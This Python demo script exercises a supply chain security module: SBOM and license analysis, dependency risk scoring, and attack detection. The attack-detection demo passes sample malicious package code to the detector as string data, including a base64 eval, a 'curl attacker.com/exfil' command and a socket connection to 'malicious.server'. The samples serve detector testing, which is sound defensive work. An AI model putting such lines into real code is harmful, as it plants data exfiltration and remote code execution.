#!/usr/bin/env python3
"""
Supply Chain Security Module Demonstration

This script demonstrates the comprehensive supply chain security capabilities
of the CIV-ARCOS system.
"""

from civ_arcos.analysis.supply_chain_security import (
    SupplyChainSecurityModule,
    PackageEvidence,
    DependencyChanges,
)


def print_section(title):
    """Print a formatted section header."""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)


def demo_sbom_analysis():
    """Demonstrate SBOM analysis capabilities."""
    print_section("SBOM Analysis & Vulnerability Detection")

    security = SupplyChainSecurityModule()

    # Sample project with multiple ecosystems
    project_dependencies = {
        "project_name": "MyWebApplication",
        "dependencies": {
            "pypi": [
                {
                    "name": "requests",
                    "version": "2.28.0",
                    "license": "Apache-2.0",
                    "source": "pypi",
                },
                {
                    "name": "django",
                    "version": "3.2.0",
                    "license": "BSD-3-Clause",
                    "source": "pypi",
                    "dependencies": ["sqlparse", "asgiref", "pytz"],
                },
                {
                    "name": "cryptography",
                    "version": "0.8.0",  # Old pre-1.0 version
                    "license": "Apache-2.0",
                    "source": "pypi",
                },
            ],
            "npm": [
                {
                    "name": "lodash",
                    "version": "4.17.21",
                    "license": "MIT",
                    "source": "npm",
                },
                {
                    "name": "axios",
                    "version": "0.21.1",
                    "license": "MIT",
                    "source": "npm",
                },
            ],
        },
    }

    # Perform SBOM analysis
    result = security.sbom_analysis(project_dependencies)

    print("\n📋 SBOM Document:")
    print(f"  Project: {result['sbom_document']['metadata']['project']}")
    print(f"  Total Components: {len(result['sbom_document']['components'])}")
    print(f"  Total Dependencies: {len(result['sbom_document']['dependencies'])}")

    print("\n🔍 Components by Ecosystem:")
    ecosystems = {}
    for component in result["sbom_document"]["components"]:
        eco = component["ecosystem"]
        ecosystems[eco] = ecosystems.get(eco, 0) + 1

    for eco, count in ecosystems.items():
        print(f"  {eco}: {count} packages")

    print("\n⚠️  Vulnerability Analysis:")
    vuln_analysis = result["vulnerability_analysis"]
    print(
        f"  Direct Vulnerabilities: {len(vuln_analysis['direct_vulnerabilities'])}"
    )
    print(
        f"  Propagation Paths: {len(vuln_analysis['propagation_paths'])}"
    )

    print("\n📜 License Compliance:")
    license_info = result["license_compliance"]
    print(f"  Compliant Packages: {len(license_info['compliant'])}")
    print(f"  Non-Compliant: {len(license_info['non_compliant'])}")
    print(f"  Unknown Licenses: {len(license_info['unknown'])}")
    print(f"  Risk Level: {license_info['risk_level'].upper()}")

    print("\n🎯 Supply Chain Risks:")
    risks = result["supply_chain_risks"]
    print(f"  High-Risk Components: {len(risks['high_risk_components'])}")
    for risk in risks["high_risk_components"][:3]:  # Show first 3
        print(f"    - {risk['component']}: {risk['reason']}")

    print(f"\n📊 Overall Risk Score: {result['risk_score']:.1f}/100")

    print("\n🔧 Remediation Recommendations:")
    for i, rec in enumerate(result["remediation_recommendations"][:3], 1):
        print(
            f"  {i}. [{rec['priority'].upper()}] {rec['action']}"
        )

    return result


def demo_dependency_risk_scoring():
    """Demonstrate dependency risk scoring."""
    print_section("Dependency Risk Scoring")

    security = SupplyChainSecurityModule()

    # Create detailed package evidence
    evidence = PackageEvidence("popular-web-framework", "2.5.0")

    # Add maintainer information
    evidence.maintainer_info = ["alice_dev", "bob_maintainer", "charlie_contrib"]
    evidence.commit_history = {
        "alice_dev": {"commits": 450, "years_active": 5},
        "bob_maintainer": {"commits": 280, "years_active": 3},
        "charlie_contrib": {"commits": 75, "years_active": 2},
    }
    evidence.community_metrics = {
        "alice_dev": {"followers": 1200, "projects": 15},
        "bob_maintainer": {"followers": 650, "projects": 8},
        "charlie_contrib": {"followers": 180, "projects": 3},
    }

    # Add release history
    evidence.release_history = [
        {"version": "2.0.0", "date": "2021-01-15"},
        {"version": "2.1.0", "date": "2021-04-20"},
        {"version": "2.2.0", "date": "2021-08-10"},
        {"version": "2.3.0", "date": "2022-02-05"},
        {"version": "2.4.0", "date": "2022-09-15"},
        {"version": "2.5.0", "date": "2023-05-20"},
    ]

    # Security patch timing
    evidence.security_patch_timing = [
        {"cve": "CVE-2021-1234", "days": 14},  # Fast response
        {"cve": "CVE-2022-5678", "days": 7},  # Very fast
    ]

    # Issue resolution metrics
    evidence.issue_metrics = {"rate": 0.78, "avg_days": 12}

    # Historical vulnerabilities
    evidence.cve_history = [
        {"id": "CVE-2021-1234", "severity": "medium"},
        {"id": "CVE-2022-5678", "severity": "low"},
    ]

    # Dependencies
    evidence.direct_deps = ["dep1", "dep2", "dep3", "dep4"]
    evidence.transitive_deps = [
        "trans_dep1",
        "trans_dep2",
        "trans_dep3",
        "trans_dep4",
        "trans_dep5",
    ]
    evidence.circular_deps = []  # No circular dependencies

    # Supply chain integrity
    evidence.cryptographic_signatures = {"verified": True, "algorithm": "RSA-4096"}
    evidence.reproducible_builds = True
    evidence.source_availability = True

    # Calculate risk score
    risk_score = security.dependency_risk_scoring(evidence)

    print(f"\n📦 Package: {evidence.package_name} v{evidence.version}")
    print(f"\n👥 Maintainer Information:")
    print(f"  Total Maintainers: {len(evidence.maintainer_info)}")
    for maintainer in evidence.maintainer_info:
        commits = evidence.commit_history.get(maintainer, {}).get("commits", 0)
        years = evidence.commit_history.get(maintainer, {}).get("years_active", 0)
        print(f"    - {maintainer}: {commits} commits over {years} years")

    print(f"\n🔄 Maintenance Health:")
    print(f"  Release History: {len(evidence.release_history)} releases")
    print(
        f"  Security Response Time: Avg {sum(p['days'] for p in evidence.security_patch_timing) / len(evidence.security_patch_timing):.1f} days"
    )
    print(
        f"  Issue Resolution Rate: {evidence.issue_metrics['rate'] * 100:.0f}%"
    )

    print(f"\n🔒 Security Track Record:")
    print(f"  Total CVEs: {len(evidence.cve_history)}")
    print(f"  Average Security Response: Fast (< 14 days)")

    print(f"\n📊 Dependency Complexity:")
    print(f"  Direct Dependencies: {len(evidence.direct_deps)}")
    print(f"  Transitive Dependencies: {len(evidence.transitive_deps)}")
    print(f"  Circular Dependencies: {len(evidence.circular_deps)}")

    print(f"\n✅ Supply Chain Integrity:")
    print(f"  Cryptographic Signatures: {'Verified' if evidence.cryptographic_signatures.get('verified') else 'Not Verified'}")
    print(f"  Reproducible Builds: {'Yes' if evidence.reproducible_builds else 'No'}")
    print(f"  Source Availability: {'Yes' if evidence.source_availability else 'No'}")

    print(f"\n🎯 Overall Risk Score: {risk_score:.2f}/100")

    # Interpret score
    if risk_score < 25:
        risk_level = "LOW"
        interpretation = "This package has excellent security practices"
    elif risk_score < 50:
        risk_level = "MEDIUM"
        interpretation = "This package is generally safe but monitor for updates"
    elif risk_score < 75:
        risk_level = "HIGH"
        interpretation = "This package requires careful monitoring"
    else:
        risk_level = "CRITICAL"
        interpretation = "Consider alternatives or additional security measures"

    print(f"  Risk Level: {risk_level}")
    print(f"  Interpretation: {interpretation}")

    return risk_score


def demo_attack_detection():
    """Demonstrate supply chain attack detection."""
    print_section("Supply Chain Attack Detection")

    security = SupplyChainSecurityModule()

    # Create dependency changes scenario
    changes = DependencyChanges()

    # Known good packages
    changes.known_good_packages = {
        "lodash",
        "express",
        "react",
        "axios",
        "moment",
        "requests",
        "django",
    }

    # Newly added packages with typosquatting attempts
    changes.newly_added_packages = {
        "lodosh",  # Typosquatting of lodash
        "requets",  # Typosquatting of requests
        "expres",  # Typosquatting of express
    }

    # Recent behavioral changes
    changes.recent_updates = [
        {"package": "legacy-util", "size": 5000},  # 10x size increase
    ]

    changes.historical_behavior = {
        "legacy-util": {"size": 500},
    }

    # Suspicious package code
    changes.package_code = {
        "lodosh": """
import os
import base64

def process_data(data):
    # Suspicious: eval with base64 decode
    eval(base64.b64decode(data))
    os.system('curl attacker.com/exfil')
    return data
        """,
        "crypto-utils": """
import socket

def init():
    # Suspicious: opening socket connection
    s = socket.socket()
    s.connect(('malicious.server', 8080))
        """,
    }

    # Maintainer changes
    changes.maintainer_changes = [
        {
            "package": "old-util",
            "type": "ownership_transfer",
            "old_owner": "original_maintainer",
            "new_owner": "new_suspicious_account",
            "days_since_last_activity": 400,  # Dormant for over a year
        }
    ]

    changes.change_timing = {}

    # Perform attack detection
    result = security.supply_chain_attack_detection(changes)

    print("\n🎯 Attack Probability Analysis:")
    probability = result["attack_probability"]
    print(f"  Overall Attack Probability: {probability:.1f}%")

    if probability < 25:
        threat_level = "LOW"
    elif probability < 50:
        threat_level = "MEDIUM"
    elif probability < 75:
        threat_level = "HIGH"
    else:
        threat_level = "CRITICAL"

    print(f"  Threat Level: {threat_level}")

    print("\n🔍 Threat Indicators:")

    # Behavioral anomalies
    behavioral = result["threat_indicators"]["behavioral_anomalies"]
    print(f"\n  1. Behavioral Anomalies: {'DETECTED' if behavioral['detected'] else 'None'}")
    if behavioral["detected"]:
        for change in behavioral["changes"]:
            print(
                f"     - {change['package']}: {change['type']} "
                f"({change['old_value']} → {change['new_value']})"
            )

    # Typosquatting
    typosquat = result["threat_indicators"]["typosquatting"]
    print(
        f"\n  2. Typosquatting: {'DETECTED' if typosquat['detected'] else 'None'}"
    )
    if typosquat["detected"]:
        for suspect in typosquat["suspects"]:
            print(
                f"     - '{suspect['suspicious_package']}' similar to "
                f"'{suspect['legitimate_package']}' "
                f"(similarity: {suspect['similarity'] * 100:.0f}%)"
            )

    # Code injection
    code_inj = result["threat_indicators"]["code_injection"]
    print(
        f"\n  3. Malicious Code Patterns: {'DETECTED' if code_inj['detected'] else 'None'}"
    )
    if code_inj["detected"]:
        for finding in code_inj["findings"]:
            print(
                f"     - {finding['package']}: Found {finding['matches']} "
                f"suspicious pattern(s)"
            )

    # Maintainer hijacking
    hijack = result["threat_indicators"]["maintainer_hijacking"]
    print(
        f"\n  4. Maintainer Compromise: {'DETECTED' if hijack['detected'] else 'None'}"
    )
    if hijack["detected"]:
        for change in hijack["suspicious_changes"]:
            print(f"     - {change['package']}: {change['reason']}")

    print("\n⚠️  Recommended Actions:")
    for i, action in enumerate(result["recommended_actions"], 1):
        print(
            f"  {i}. [{action['priority'].upper()}] {action['action']}"
        )
        print(f"     → {action['description']}")

    print("\n📡 Ongoing Monitoring Recommendations:")
    for i, recommendation in enumerate(result["monitoring_recommendations"], 1):
        print(f"  {i}. {recommendation}")

    return result


def demo_comprehensive_report():
    """Generate a comprehensive supply chain security report."""
    print_section("Comprehensive Supply Chain Security Report")

    security = SupplyChainSecurityModule()

    # Perform SBOM analysis
    project_dependencies = {
        "project_name": "Enterprise Application",
        "dependencies": {
            "pypi": [
                {"name": "requests", "version": "2.28.0", "license": "Apache-2.0"},
                {"name": "flask", "version": "2.0.0", "license": "BSD-3-Clause"},
                {
                    "name": "cryptography",
                    "version": "0.9.0",
                    "license": "Apache-2.0",
                },
            ],
            "npm": [
                {"name": "express", "version": "4.18.0", "license": "MIT"},
                {"name": "lodash", "version": "4.17.21", "license": "MIT"},
            ],
        },
    }

    sbom_analysis = security.sbom_analysis(project_dependencies)

    # Define risk scores
    risk_scores = {
        "requests": 25.0,
        "flask": 35.0,
        "cryptography": 65.0,  # Higher risk - old version
        "express": 30.0,
        "lodash": 40.0,
    }

    # Generate comprehensive report
    report = security.generate_supply_chain_report(sbom_analysis, risk_scores)

    print("\n📊 Executive Summary:")
    exec_summary = report["executive_summary"]
    print(
        f"  Overall Risk Level: {exec_summary['overall_risk_level'].upper()}"
    )
    print(f"  Total Components: {exec_summary['total_components']}")
    print(
        f"  Critical Vulnerabilities: {exec_summary['critical_vulnerabilities']}"
    )
    print(
        f"  High Vulnerabilities: {exec_summary['high_vulnerabilities']}"
    )
    print(
        f"  License Compliance Status: {exec_summary['license_compliance_status'].upper()}"
    )

    print("\n🔍 Key Findings:")
    for i, finding in enumerate(exec_summary["key_findings"], 1):
        print(f"  {i}. {finding}")

    print("\n🗺️  Risk Heat Map:")
    heat_map = report["risk_heat_map"]
    print(
        f"  High Risk Components: {len(heat_map['high_risk'])}"
    )
    for component in heat_map["high_risk"]:
        print(
            f"    - {component['component']}: {component['score']:.1f}/100"
        )

    print(
        f"  Medium Risk Components: {len(heat_map['medium_risk'])}"
    )
    for component in heat_map["medium_risk"]:
        print(
            f"    - {component['component']}: {component['score']:.1f}/100"
        )

    print(f"  Low Risk Components: {len(heat_map['low_risk'])}")

    print("\n📋 Compliance Mapping:")
    compliance = report["compliance_mapping"]
    for req, details in compliance.items():
        print(f"  {details['standard']}:")
        print(f"    Status: {details['status'].upper()}")
        print(f"    Notes: {details['notes']}")

    print("\n🛠️  Action Plan:")
    action_plan = report["action_plan"]
    print("  Immediate Actions (Within 7 days):")
    for action in action_plan["immediate_actions"]:
        print(f"    • {action}")

    print("\n  Short-Term Actions (Within 30 days):")
    for action in action_plan["short_term_actions"]:
        print(f"    • {action}")

    print("\n  Long-Term Actions (90-day roadmap):")
    for action in action_plan["long_term_actions"]:
        print(f"    • {action}")

    print(f"\n  Timeline: {action_plan['timeline']}")

    print("\n🔄 Continuous Monitoring Setup:")
    monitoring = report["continuous_monitoring_setup"]
    print(
        f"  Monitoring Frequency: {monitoring['monitoring_frequency']}"
    )
    print("  Automated Scans:")
    for scan in monitoring["automated_scans"]:
        print(f"    • {scan}")

    print("\n  Alert Thresholds:")
    for threshold, value in monitoring["alert_thresholds"].items():
        print(f"    • {threshold}: {value}")

    return report


def main():
    """Run all demonstrations."""
    print("\n" + "=" * 80)
    print("  CIV-ARCOS Supply Chain Security Module")
    print("  Comprehensive SBOM Analysis & Threat Detection")
    print("=" * 80)

    try:
        # Demo 1: SBOM Analysis
        demo_sbom_analysis()

        # Demo 2: Dependency Risk Scoring
        demo_dependency_risk_scoring()

        # Demo 3: Attack Detection
        demo_attack_detection()

        # Demo 4: Comprehensive Report
        demo_comprehensive_report()

        print("\n" + "=" * 80)
        print("  ✅ All demonstrations completed successfully!")
        print("=" * 80 + "\n")

    except Exception as e:
        print(f"\n❌ Error during demonstration: {e}")
        raise


if __name__ == "__main__":
    main()
